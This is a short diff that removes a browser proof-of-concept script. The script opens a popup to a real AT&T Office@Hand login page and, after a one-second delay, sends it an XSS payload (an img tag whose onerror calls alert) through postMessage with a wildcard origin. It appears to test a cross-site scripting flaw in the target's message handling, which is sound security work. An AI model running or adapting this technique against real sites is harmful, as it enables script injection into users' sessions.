@@ -1,12 +1,1 @@
-<script>
-    const popup = window.open("https://app.officeathand.att.com/login?replaceState=%7B%22from%22%3A%7B%22pathname%22%3A%22%2F%22%7D%7D", "_blank");
-  
-    const payload = `
-      <img src=x onerror=alert('XSS!')>
-    `;
-  
-    // Give it a second to load
-    setTimeout(() => {
-      popup.postMessage(payload, "*");
-    }, 1000);
-  </script>
+
